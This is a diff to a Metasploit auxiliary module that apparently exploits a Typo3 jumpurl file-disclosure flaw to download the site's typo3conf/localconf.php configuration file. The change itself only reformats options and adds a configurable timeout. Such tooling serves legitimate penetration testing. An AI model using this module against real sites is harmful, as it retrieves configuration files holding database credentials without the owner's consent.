@@ -38,10 +38,15 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('URI', [true, "Typo3 Path", "/"]),
-        OptString.new('RFILE', [true, "The remote file to download", 'typo3conf/localconf.php']),
-        OptString.new('LFILE',[true, "The local filename to store the data", "localconf.php"]),
+        OptString.new('URI', [ true, "Typo3 Path", "/"]),
+        OptString.new('RFILE', [ true, "The remote file to download", 'typo3conf/localconf.php' ]),
+        OptString.new('LFILE',[ true, "The local filename to store the data", "localconf.php" ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 25
   end
 
   def run
@@ -88,7 +93,7 @@ class Metasploit3 < Msf::Auxiliary
         'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
         'Connection' => 'Close',
       }
-    },25)
+    }, timeout)
 
     if (file and file.message = "OK")
       if file.body == 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
